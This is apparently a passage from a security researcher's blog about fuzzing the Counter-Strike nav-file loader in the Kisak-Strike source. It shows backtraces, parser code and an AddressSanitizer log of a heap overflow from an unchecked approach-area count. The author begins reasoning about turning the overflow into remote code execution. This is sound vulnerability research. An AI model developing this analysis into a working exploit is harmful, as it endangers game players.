#9  0x00007fffddf038d4 in ScriptVariant_t::Free (this=0x7fffffffa050) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/public/vscript/ivscript.h:366
#10 CSquirrelVM::TranslateCall (hVM=<optimized out>) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/vscript/languages/squirrel/vsquirrel/vsquirrel.cpp:1902
#11 0x00007fffde0fde4f in SQVM::CallNative (this=0x613000056f80, nclosure=<optimized out>, nargs=<optimized out>, stackbase=<optimized out>, retval=..., suspend=<optimized out>) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/vscript/languages/squirrel/squirrel/sqvm.cpp:1189
#12 0x00007fffde106916 in SQVM::Execute (this=0x613000056f80, closure=..., target=<optimized out>, nargs=<optimized out>, stackbase=<optimized out>, outres=..., raiseerror=<optimized out>, et=<optimized out>) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/vscript/languages/squirrel/squirrel/sqvm.cpp:801
#13 0x00007fffde10db16 in SQVM::Call (this=this@entry=0x613000056f80, closure=..., nparams=nparams@entry=1, stackbase=stackbase@entry=1, outres=..., raiseerror=raiseerror@entry=1) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/vscript/languages/squirrel/squirrel/sqvm.cpp:1462
#14 0x00007fffddf637ba in sq_call (v=0x613000056f80, params=<optimized out>, retval=<optimized out>, raiseerror=raiseerror@entry=1) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/vscript/languages/squirrel/squirrel/sqapi.cpp:957
#15 0x00007fffddeee4aa in CSquirrelVM::ExecuteFunction (this=0x6120002d8bc0, hFunction=<optimized out>, pArgs=<optimized out>, nArgs=<optimized out>, pReturn=<optimized out>, hScope=<optimized out>, bWait=<optimized out>) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/vscript/languages/squirrel/vsquirrel/vsquirrel.cpp:948
#16 0x00007fffddef083f in CSquirrelVM::Run (this=<optimized out>, hScript=<optimized out>, hScope=<optimized out>, bWait=<optimized out>) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/vscript/languages/squirrel/vsquirrel/vsquirrel.cpp:779
#17 0x00007fffb7747622 in VScriptRunScript (pszScriptName=0x603001817aa0 "training/radiovoice.nut", hScope=<optimized out>, bWarnMissing=<optimized out>) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/game/shared/vscript_shared.cpp:147
#18 0x00007fffb5990177 in CBaseEntity::RunScriptFile (this=this@entry=0x622000d95100, pScriptFile=<optimized out>, bUseRootScope=<optimized out>) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/game/shared/vscript_shared.h:22
#19 0x00007fffb59b2339 in CBaseEntity::RunVScripts (this=<optimized out>) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/public/tier1/utlmemory.h:608
#20 0x00007fffb759ab2d in DispatchSpawn (pEntity=pEntity@entry=0x622000d95100, bRunVScripts=bRunVScripts@entry=true) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/game/server/util.cpp:1973
#21 0x00007fffb665f9b7 in SpawnAllEntities (nEntities=<optimized out>, pSpawnList=<optimized out>, bActivateEntities=<optimized out>) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/game/server/mapentities.cpp:277
#22 0x00007fffb6666689 in CMapEntitySpawner::SpawnAndActivate (bActivateEntities=<optimized out>, this=0x7fffffffb4b0) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/game/server/mapentities.cpp:491
#23 MapEntity_ParseAllEntities (pMapData=<optimized out>, pMapData@entry=0x7fff9e9af800 "{\n\"world_maxs\" \"4048 3040 620\"\n\"world_mins\" \"-2526 -5088 -112\"\n\"skyname\" \"sky_cs15_daylight01_hdr\"\n\"maxpropscreenwidth\" \"-1\"\n\"detailvbsp\" \"detail.vbsp\"\n\"detailmaterial\" \"detail/detailsprites\"\n\"classna"..., pFilter=pFilter@entry=0x7fffffffc6f0, bActivateEntities=bActivateEntities@entry=false) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/game/server/mapentities.cpp:568
#24 0x00007fffb63b56e7 in CServerGameDLL::LevelInit (this=<optimized out>, pMapName=<optimized out>, pMapEntities=<optimized out>, pOldLevel=<optimized out>, pLandmarkName=<optimized out>, loadGame=<optimized out>, background=<optimized out>) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/game/server/gameinterface.cpp:1270
#25 0x00007fffe433804f in CServerPlugin::LevelInit (this=<optimized out>, pMapName=pMapName@entry=0x7fffe800c6c0 <g_HostState+32> "training1", pMapEntities=<optimized out>, pOldLevel=pOldLevel@entry=0x0, pLandmarkName=pLandmarkName@entry=0x0, loadGame=loadGame@entry=false, background=<optimized out>) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/engine/sv_plugin.cpp:405
#26 0x00007fffe4ac8765 in Host_NewGame (mapName=mapName@entry=0x7fffe800c6c0 <g_HostState+32> "training1", mapGroupName=mapGroupName@entry=0x7fffe800c7c0 <g_HostState+288> "", loadGame=loadGame@entry=false, bBackgroundLevel=<optimized out>, bSplitScreenConnect=<optimized out>, pszOldMap=pszOldMap@entry=0x0, pszLandmark=<optimized out>) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/engine/host.cpp:6293
#27 0x00007fffe4b282e0 in CHostState::State_NewGame (this=this@entry=0x7fffe800c6a0 <g_HostState>) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/engine/host_state.cpp:436
#28 0x00007fffe4b2d657 in CHostState::FrameUpdate (this=<optimized out>, time=<optimized out>) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/engine/host_state.cpp:788
#29 0x00007fffe4ff8d02 in CEngine::Frame (this=0x7fffe811faa0 <g_Engine>) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/engine/sys_engine.cpp:572
#30 0x00007fffe4fd42f8 in CEngineAPI::MainLoop (this=0x7fffe811f500 <s_EngineAPI>) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/engine/sys_dll2.cpp:1161
#31 0x00007fffe4fd4eff in CModAppSystemGroup::Main (this=<optimized out>) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/engine/sys_dll2.cpp:2416
#32 0x00007fffe65f3f35 in CAppSystemGroup::Run (this=this@entry=0x7fffffffd460) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/appframework/AppSystemGroup.cpp:775
#33 0x00007fffe4fe46ce in CEngineAPI::RunListenServer (this=0x7fffe811f500 <s_EngineAPI>) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/engine/sys_dll2.cpp:1437
#34 0x00007ffff2b8a845 in CAppSystemGroup::Run (this=0x7fffffffd7e0) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/appframework/AppSystemGroup.cpp:775
#35 0x00007ffff2b8a845 in CAppSystemGroup::Run (this=0x7fffffffd6e0) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/appframework/AppSystemGroup.cpp:775
#36 0x00007ffff2b540cb in LauncherMain (argc=<optimized out>, argv=<optimized out>) at /home/cyberhacker/Fuzzingnavfiles/Kisak-Strike/launcher/launcher.cpp:1897
#37 0x00007ffff6d76083 in __libc_start_main (main=0x555555557390 <main(int, char**)>, argc=8, argv=0x7fffffffdb38, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdb28) at ../csu/libc-start.c:308
#38 0x000055555555766e in _start ()








....






int DispatchSpawn( CBaseEntity *pEntity, bool bRunVScripts )
{
	if ( pEntity )
	{
		MDLCACHE_CRITICAL_SECTION();

		// keep a smart pointer that will now if the object gets deleted
		EHANDLE pEntSafe;
		pEntSafe = pEntity;

		// Initialize these or entities who don't link to the world won't have anything in here
		// is this necessary?
		//pEntity->SetAbsMins( pEntity->GetOrigin() - Vector(1,1,1) );
		//pEntity->SetAbsMaxs( pEntity->GetOrigin() + Vector(1,1,1) );


		if( bRunVScripts )
		{
			pEntity->RunVScripts();
			pEntity->RunPrecacheScripts();
		}

#if defined(TRACK_ENTITY_MEMORY) && defined(USE_MEM_DEBUG)
		const char *pszClassname = NULL;
		int iClassname = ((CEntityFactoryDictionary*)EntityFactoryDictionary())->m_Factories.Find( pEntity->GetClassname() );
		if ( iClassname != ((CEntityFactoryDictionary*)EntityFactoryDictionary())->m_Factories.InvalidIndex() )
			pszClassname = ((CEntityFactoryDictionary*)EntityFactoryDictionary())->m_Factories.GetElementName( iClassname );
		if ( pszClassname )
		{
			MemAlloc_PushAllocDbgInfo( pszClassname, __LINE__ );
		}




```
{% endraw %}
So we need to somehow disable bRunVScripts or disable the asan sanitizer on the crashing code pieces. I am going to try disabling the vscripts first.

These squirrel scripts which essentially run inside a virtual machine are also an interesting target for fuzzing, but maybe I will focus on that later. (It seems that it isn't even developed by valve, but it is a third party piece of software http://www.squirrel-lang.org/ )

There is no flag to not run Vscripts, so I am going to hardcode the Checks with if ( 0 ) and hope that it does not cause any problems down the line.

Recompile....

Now it seems to work in the gdb debugger without a crash. Lets see what happens with afl...

The reason why I chose the training1.nav file as a corpus is because the other nav files were huge compared to it. The bigger the file the longer it takes to parse. Even the training1.nav file is 6.8k in size:

{% raw %}
```
...  ...    6,8K Jun 10 14:19 training1.nav
```
{% endraw %}

The biggest ones are more than one megabyte in size:

{% raw %}
```
-rw-rw-r-- 1 cyberhacker cyberhacker 1,6M Jun 10 14:19 de_lake.nav
```
{% endraw %}

The fuzzer is still so slow for some reason.

I am going to add some timing stuff to see where it takes the most amount of time. Just so say how ass the performance is, I got 61 execs in 13 minutes of fuzzing :( .

I am using this:


{% raw %}
```

https://stackoverflow.com/questions/5833094/get-a-timestamp-in-c-in-microseconds


```
{% endraw %}

Looking at the output it seems that the majority of the time is taken in this loop:

{% raw %}
```

	for( i=0; i<count; ++i )
	{
		CNavArea *area = TheNavMesh->CreateArea();
		area->Load( fileBuffer, version, subVersion );
		TheNavAreas.AddToTail( area );

		area->GetExtent( &areaExtent );

		if (areaExtent.lo.x < extent.lo.x)
			extent.lo.x = areaExtent.lo.x;
		if (areaExtent.lo.y < extent.lo.y)
			extent.lo.y = areaExtent.lo.y;
		if (areaExtent.hi.x > extent.hi.x)
			extent.hi.x = areaExtent.hi.x;
		if (areaExtent.hi.y > extent.hi.y)
			extent.hi.y = areaExtent.hi.y;
	}

	
	
......



NavErrorType CNavArea::Load( CUtlBuffer &fileBuffer, unsigned int version, unsigned int subVersion )
{
	// load ID
	m_id = fileBuffer.GetUnsignedInt();

	// update nextID to avoid collisions
	if (m_id >= m_nextID)
		m_nextID = m_id+1;

	// load attribute flags
	if ( version <= 8 )
	{
		m_attributeFlags = fileBuffer.GetUnsignedChar();
	}
	else if ( version < 13 )
	{
		m_attributeFlags = fileBuffer.GetUnsignedShort();
	}
	else
	{
		m_attributeFlags = fileBuffer.GetInt();
	}

	// load extent of area
	fileBuffer.Get( &m_nwCorner, 3*sizeof(float) );
	fileBuffer.Get( &m_seCorner, 3*sizeof(float) );

	if ( ( m_seCorner.x - m_nwCorner.x ) > 0.0f && ( m_seCorner.y - m_nwCorner.y ) > 0.0f )
	{
		m_invDxCorners = 1.0f / ( m_seCorner.x - m_nwCorner.x );
		m_invDyCorners = 1.0f / ( m_seCorner.y - m_nwCorner.y );
	}
	else
	{
		m_invDxCorners = m_invDyCorners = 0;

		DevWarning( "Degenerate Navigation Area #%d at setpos %g %g %g\n", 
			m_id, m_nwCorner.x, m_nwCorner.y, m_nwCorner.z );
	}

	// load heights of implicit corners
	m_neZ = fileBuffer.GetFloat();
	m_swZ = fileBuffer.GetFloat();

	CheckWaterLevel();

	// load connections (IDs) to adjacent areas
	// in the enum order NORTH, EAST, SOUTH, WEST
	for( int d=0; d<NUM_DIRECTIONS; d++ )
	{
		// load number of connections for this direction
		unsigned int count = fileBuffer.GetUnsignedInt();
		Assert( fileBuffer.IsValid() );

		m_connect[d].EnsureCapacity( count );
		for( unsigned int i=0; i<count; ++i )
		{
			NavConnect connect;
			connect.id = fileBuffer.GetUnsignedInt();
			Assert( fileBuffer.IsValid() );

			// don't allow self-referential connections
			if ( connect.id != m_id )
			{
				m_connect[d].AddToTail( connect );
			}
		}
	}

	//
	// Load hiding spots
	//

	// load number of hiding spots
	unsigned char hidingSpotCount = fileBuffer.GetUnsignedChar();

	if (version == 1)
	{
		// load simple vector array
		Vector pos;
		for( int h=0; h<hidingSpotCount; ++h )
		{
			fileBuffer.Get( &pos, 3 * sizeof(float) );

			// create new hiding spot and put on master list
			HidingSpot *spot = TheNavMesh->CreateHidingSpot();
			spot->SetPosition( pos );
			spot->SetFlags( HidingSpot::IN_COVER );
			m_hidingSpots.AddToTail( spot );
		}
	}
	else
	{
		// load HidingSpot objects for this area
		for( int h=0; h<hidingSpotCount; ++h )
		{
			// create new hiding spot and put on master list
			HidingSpot *spot = TheNavMesh->CreateHidingSpot();

			spot->Load( fileBuffer, version );
			
			m_hidingSpots.AddToTail( spot );
		}
	}

	if ( version < 15 )
	{
		//
		// Eat the approach areas
		//
		int nToEat = fileBuffer.GetUnsignedChar();

		// load approach area info (IDs)
		for( int a=0; a<nToEat; ++a )
		{
			fileBuffer.GetUnsignedInt();
			fileBuffer.GetUnsignedInt();
			fileBuffer.GetUnsignedChar();
			fileBuffer.GetUnsignedInt();
			fileBuffer.GetUnsignedChar();
		}
	}


	//
	// Load encounter paths for this area
	//
	unsigned int count = fileBuffer.GetUnsignedInt();

	if (version < 3)
	{
		// old data, read and discard
		for( unsigned int e=0; e<count; ++e )
		{
			SpotEncounter encounter;

			encounter.from.id = fileBuffer.GetUnsignedInt();
			encounter.to.id = fileBuffer.GetUnsignedInt();

			fileBuffer.Get( &encounter.path.from.x, 3 * sizeof(float) );
			fileBuffer.Get( &encounter.path.to.x, 3 * sizeof(float) );

			// read list of spots along this path
			unsigned char spotCount = fileBuffer.GetUnsignedChar();
		
			for( int s=0; s<spotCount; ++s )
			{
				fileBuffer.GetFloat();
				fileBuffer.GetFloat();
				fileBuffer.GetFloat();
				fileBuffer.GetFloat();
			}
		}
		return NAV_OK;
	}

	for( unsigned int e=0; e<count; ++e )
	{
		SpotEncounter *encounter = new SpotEncounter;

		encounter->from.id = fileBuffer.GetUnsignedInt();

		unsigned char dir = fileBuffer.GetUnsignedChar();
		encounter->fromDir = static_cast<NavDirType>( dir );

		encounter->to.id = fileBuffer.GetUnsignedInt();

		dir = fileBuffer.GetUnsignedChar();
		encounter->toDir = static_cast<NavDirType>( dir );

		// read list of spots along this path
		unsigned char spotCount = fileBuffer.GetUnsignedChar();
	
		SpotOrder order;
		for( int s=0; s<spotCount; ++s )
		{
			order.id = fileBuffer.GetUnsignedInt();

			unsigned char t = fileBuffer.GetUnsignedChar();

			order.t = (float)t/255.0f;

			encounter->spots.AddToTail( order );
		}

		m_spotEncounters.AddToTail( encounter );
	}

	if (version < 5)
		return NAV_OK;

	//
	// Load Place data
	//
	PlaceDirectory::IndexType entry = fileBuffer.GetUnsignedShort();

	// convert entry to actual Place
	SetPlace( placeDirectory.IndexToPlace( entry ) );

	if ( version < 7 )
		return NAV_OK;

	// load ladder data
	for ( int dir=0; dir<CNavLadder::NUM_LADDER_DIRECTIONS; ++dir )
	{
		count = fileBuffer.GetUnsignedInt();
		for( unsigned int i=0; i<count; ++i )
		{
			NavLadderConnect connect;
			connect.id = fileBuffer.GetUnsignedInt();

			bool alreadyConnected = false;
			FOR_EACH_VEC( m_ladder[dir], j )
			{
				if ( m_ladder[dir][j].id == connect.id )
				{
					alreadyConnected = true;
					break;
				}
			}

			if ( !alreadyConnected )
			{
				m_ladder[dir].AddToTail( connect );
			}
		}
	}

	if ( version < 8 )
		return NAV_OK;

	// load earliest occupy times
	for( int i=0; i<MAX_NAV_TEAMS; ++i )
	{
		// no spot in the map should take longer than this to reach
		m_earliestOccupyTime[i] = fileBuffer.GetFloat();
	}

	if ( version < 11 )
		return NAV_OK;

	// load light intensity
	for ( int i=0; i<NUM_CORNERS; ++i )
	{
		m_lightIntensity[i] = fileBuffer.GetFloat();
	}

	if ( version < 16 )
		return NAV_OK;

	// load visibility information
	unsigned int visibleAreaCount = fileBuffer.GetUnsignedInt();

	m_potentiallyVisibleAreas.EnsureCapacity( visibleAreaCount );

	for( unsigned int j=0; j<visibleAreaCount; ++j )
	{
		AreaBindInfo info;
		info.id = fileBuffer.GetUnsignedInt();
		info.attributes = fileBuffer.GetUnsignedChar();

		m_potentiallyVisibleAreas.AddToTail( info );
	}

	// read area from which we inherit visibility
	m_inheritVisibilityFrom.id = fileBuffer.GetUnsignedInt();

	return NAV_OK;
}


```
{% endraw %}

This code hangs:

{% raw %}
```

	ConMsg("Time at start of \"load connections (IDs) to adjacent areas\": %ld\n", GetTimeStamp());
	for( int d=0; d<NUM_DIRECTIONS; d++ )
	{
		// load number of connections for this direction
		unsigned int count = fileBuffer.GetUnsignedInt();
		Assert( fileBuffer.IsValid() );

		m_connect[d].EnsureCapacity( count );
		for( unsigned int i=0; i<count; ++i )
		{
			NavConnect connect;
			connect.id = fileBuffer.GetUnsignedInt();
			Assert( fileBuffer.IsValid() );

			// don't allow self-referential connections
			if ( connect.id != m_id )
			{
				m_connect[d].AddToTail( connect );
			}
		}
	}

```
{% endraw %}

The reason why is that the count variable is taken verbatim from the filebuffer aka from the file. These unchecked loop counters are the reason why the code hangs, so we really can not do anything about them, except to manually go through each of these loop variables and add a maximum cap for them. Adding a debugging message which shows the count variable, we see that it is indeed the case.

With this code:

{% raw %}
```

	ConMsg("Time at start of \"load connections (IDs) to adjacent areas\": %ld\n", GetTimeStamp());
	for( int d=0; d<NUM_DIRECTIONS; d++ )
	{
		// load number of connections for this direction
		unsigned int count = fileBuffer.GetUnsignedInt();
		
		ConMsg("Count variable: %ld\n", count);

		Assert( fileBuffer.IsValid() );

		m_connect[d].EnsureCapacity( count );
		for( unsigned int i=0; i<count; ++i )
		{
			NavConnect connect;
			connect.id = fileBuffer.GetUnsignedInt();
			Assert( fileBuffer.IsValid() );

			// don't allow self-referential connections
			if ( connect.id != m_id )
			{
				m_connect[d].AddToTail( connect );
			}
		}
	}

```
{% endraw %}

We get this output:

{% raw %}
```

...
Degenerate Navigation Area #-2147483582 at setpos -0 -0 0
Time at start of CheckWaterLevel: 1686415138556815
Time at start of "load connections (IDs) to adjacent areas": 1686415138557257
Count variable: 134268011
...


```
{% endraw %}

As you can see, I am right.

Let's just add a timout to the afl-fuzz command line.

Let's see what we get!

-------------

And I was right! We are getting plenty of crashes. The number of those which will be useful for our purposes will probably be minimal, but atleast we are getting some crashes. I think that they have most likely patched out the aslr bug in windows such that every single module is now with aslr enabled on the windows client so I think that we need an info leak bug in addition to get an RCE further down the line. Anyway, I am going to let this run for a while and then triage all of the bugs and see if we found something interesting. See ya then!

------------

When recompiling the Netpacketfuzzer with asan I once again encountered the GetCPUInformation bug. It for some reason crashes on GetCPUInformation for some reason.

After copying libtier0 library from the other version we are now good to go again.

After triaging the crashes, it seems that the vast majority of the crashes are actually null pointer dereferences. However, there is exactly one crash which seems promising.

Here is the log:


{% raw %}
```
...

stringNumber is this 0xd2
stringNumber is this 0x2be
stringNumber is this 0x2be
stringNumber is this 0xd2
stringNumber is this 0xd2
stringNumber is this 0x2bf
stringNumber is this 0x2bf
stringNumber is this 0xd2
stringNumber is this 0xd2
stringNumber is this 0x2bc
stringNumber is this 0x2bc
stringNumber is this 0xd2
stringNumber i=================================================================
==1901227==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61a0001db208 at pc 0x7f5d8f1456c6 bp 0x7ffebf267f10 sp 0x7ffebf267f00
WRITE of size 2 at 0x61a0001db208 thread T0
    #0 0x7f5d8f1456c5 in CCSNavArea::Load(CUtlBuffer&, unsigned int, unsigned int) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_nav_area.cpp:123
    #1 0x7f5d8e051353 in CNavMesh::Load() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/nav_file.cpp:1536
    #2 0x7f5d8d2177fe in CServerGameDLL::ServerActivate(edict_t*, int, int) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/gameinterface.cpp:1377
    #3 0x7f5da6ac9512 in CServerPlugin::ServerActivate(edict_t*, int, int) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sv_plugin.cpp:421
    #4 0x7f5da6a6f9ae in SV_ActivateServer() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sv_main.cpp:2579
    #5 0x7f5da6eadbb1 in Host_NewGame(char*, char*, bool, bool, bool, char const*, char const*) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/host.cpp:6307
    #6 0x7f5da6ece0ab in CHostState::State_NewGame() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/host_state.cpp:436
    #7 0x7f5da6ed01f8 in CHostState::FrameUpdate(float) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/host_state.cpp:790
    #8 0x7f5da7108139 in CEngine::Frame() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_engine.cpp:572
    #9 0x7f5da70f82ff in CEngineAPI::MainLoop() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll2.cpp:1161
    #10 0x7f5da70f8854 in CModAppSystemGroup::Main() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll2.cpp:2416
    #11 0x7f5da70f8854 in CModAppSystemGroup::Main() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll2.cpp:2374
    #12 0x7f5da78a3a3f in CAppSystemGroup::Run() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #13 0x7f5da70fe5b2 in CEngineAPI::RunListenServer() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll2.cpp:1437
    #14 0x7f5dab903eff in CAppSystemGroup::Run() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #15 0x7f5dab903eff in CAppSystemGroup::Run() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #16 0x7f5dab8ec875 in LauncherMain /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/launcher/launcher.cpp:1897
    #17 0x7f5daf003082 in __libc_start_main ../csu/libc-start.c:308
    #18 0x558079f1f27d in _start (/home/cyberhacker/Netpacketfuzzer/game/csgo_linux64+0x127d)

0x61a0001db208 is located 8 bytes to the right of 1408-byte region [0x61a0001dac80,0x61a0001db200)
allocated by thread T0 here:
    #0 0x7f5daf85c587 in operator new(unsigned long) ../../../../src/libsanitizer/asan/asan_new_delete.cc:104
    #1 0x7f5d8f14dc85 in CSNavMesh::CreateArea() const /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_nav_mesh.cpp:71
    #2 0x7f5d8e051464 in CNavMesh::Load() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/nav_file.cpp:1535
    #3 0x7f5d8d2177fe in CServerGameDLL::ServerActivate(edict_t*, int, int) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/gameinterface.cpp:1377
    #4 0x7f5da6ac9512 in CServerPlugin::ServerActivate(edict_t*, int, int) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sv_plugin.cpp:421
    #5 0x7f5da6a6f9ae in SV_ActivateServer() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sv_main.cpp:2579
    #6 0x7f5da6eadbb1 in Host_NewGame(char*, char*, bool, bool, bool, char const*, char const*) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/host.cpp:6307
    #7 0x7f5da6ece0ab in CHostState::State_NewGame() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/host_state.cpp:436
    #8 0x7f5da6ed01f8 in CHostState::FrameUpdate(float) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/host_state.cpp:790
    #9 0x7f5da7108139 in CEngine::Frame() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_engine.cpp:572
    #10 0x7f5da70f82ff in CEngineAPI::MainLoop() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll2.cpp:1161
    #11 0x7f5da70f8854 in CModAppSystemGroup::Main() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll2.cpp:2416
    #12 0x7f5da70f8854 in CModAppSystemGroup::Main() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll2.cpp:2374
    #13 0x7f5da78a3a3f in CAppSystemGroup::Run() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #14 0x7f5da70fe5b2 in CEngineAPI::RunListenServer() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll2.cpp:1437
    #15 0x7f5dab903eff in CAppSystemGroup::Run() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #16 0x7f5dab903eff in CAppSystemGroup::Run() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #17 0x7f5dab8ec875 in LauncherMain /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/launcher/launcher.cpp:1897
    #18 0x7f5daf003082 in __libc_start_main ../csu/libc-start.c:308

SUMMARY: AddressSanitizer: heap-buffer-overflow /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_nav_area.cpp:123 in CCSNavArea::Load(CUtlBuffer&, unsigned int, unsigned int)
Shadow bytes around the buggy address:
  0x0c34800335f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3480033600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3480033610: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3480033620: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3480033630: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c3480033640: fa[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3480033650: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3480033660: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3480033670: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3480033680: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3480033690: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==1901227==ABORTING





```
{% endraw %}

and

{% raw %}
```

NavErrorType CCSNavArea::Load( CUtlBuffer &fileBuffer, unsigned int version, unsigned int subVersion )
{
	if ( version < 15 )
		return LoadLegacy(fileBuffer, version, subVersion);

	// load base class data
	NavErrorType error = CNavArea::Load( fileBuffer, version, subVersion );

	switch ( subVersion )
	{
	case 1:
		//
		// Load number of approach areas
		//
		m_approachCount = fileBuffer.GetUnsignedChar();

		// load approach area info (IDs)
		for( int a = 0; a < m_approachCount; ++a )
		{
			m_approach[a].here.id = fileBuffer.GetUnsignedInt();

			m_approach[a].prev.id = fileBuffer.GetUnsignedInt();
			m_approach[a].prevToHereHow = (NavTraverseType)fileBuffer.GetUnsignedChar();    // <--- The crash happens here.

			m_approach[a].next.id = fileBuffer.GetUnsignedInt();
			m_approach[a].hereToNextHow = (NavTraverseType)fileBuffer.GetUnsignedChar();
		}

		if ( !fileBuffer.IsValid() )
			error = NAV_INVALID_FILE;

		// fall through

	case 0:
		// legacy version
		break;

	default:
		Warning( "Unknown NavArea sub-version number\n" );
		error = NAV_INVALID_FILE;
	}

	return error;
}


```
{% endraw %}

Now, this looks very promising from an exploitation standpoint, because we can basicall overwrite stuff on the stack and then jump to an address we can control. Let's just make sure that this is not the exact same bug as this writeup: https://hackerone.com/reports/542180 . This crashes also on the newest version of the client so I think we are good.

Now exploiting this vulnerability is based on the fact that m_approach is only of size 16:

in cs_nav_area.h

{% raw %}
```
	enum { MAX_APPROACH_AREAS = 16 };
	ApproachInfo m_approach[ MAX_APPROACH_AREAS ];
	unsigned char m_approachCount;

	unsigned char m_paddingToAlignTo128[ int( 0 - sizeof( CNavArea ) - ( sizeof( ApproachInfo ) * MAX_APPROACH_AREAS ) - sizeof( unsigned char ) ) & 127 ];

```
{% endraw %}

m_approachCount does not have any bounds checks so we can overflow the m_approach list. What makes this difficult is that we are not writing to m_approach directly, but instead we are writing elements of m_approach.

So we can control a which is the index to the m_approach list. When this counter reaches 17 we can access out of bounds memory. When the counter is 17, `m_approach[17]` points to m_approachCount. The first byte of the integer then read by `m_approach[a].here.id = fileBuffer.GetUnsignedInt();` is the count. But then the Subsequent stuff will be read from m_paddingToAlignTo128 . Now searching for m_paddingToAlignTo128 we see that there are no references to it.







